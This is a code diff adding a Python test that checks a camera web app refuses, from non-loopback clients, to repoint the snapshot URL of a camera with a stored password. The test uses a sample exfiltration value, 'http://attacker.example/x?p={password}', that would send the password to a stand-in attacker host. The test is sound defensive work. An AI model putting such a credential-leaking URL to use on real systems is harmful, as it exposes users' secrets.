@@ -1599,6 +1599,25 @@ def test_moving_a_camera_with_a_stored_password_needs_loopback(db_path, monkeypa
         web.shutdown(server)
 
 
+def test_pointing_the_snapshot_url_elsewhere_needs_loopback_too(db_path, monkeypatch):
+    """The snapshot URL is a second place the stored password gets sent ({password} is filled
+    in at startup), so changing it is the same credential operation as moving the camera."""
+    cfg = _cam_cfg(db_path)
+    server = _cam_server(cfg)
+    port = server.server_address[1]
+    try:
+        _, saved = _post(port, "/api/cameras/save", dict(NET_CAM, password="hunter2"))
+        monkeypatch.setattr(web, "_is_loopback_client", lambda peer: False)
+        status, body = _post(port, "/api/cameras/save",
+                             dict(NET_CAM, id=saved["camera"]["id"],
+                                  snapshot_url="http://attacker.example/x?p={password}"))
+        assert status == 403 and "sent to wherever it points" in body["error"]
+        _, listed = _get(port, "/api/cameras")
+        assert listed["rows"][0]["snapshot_url"] is None
+    finally:
+        web.shutdown(server)
+
+
 def test_moving_a_camera_without_a_stored_password_is_ordinary(db_path, monkeypatch):
     """Nothing to leak, so this stays editable from anywhere -- the restriction is about the
     secret, not about cameras."""
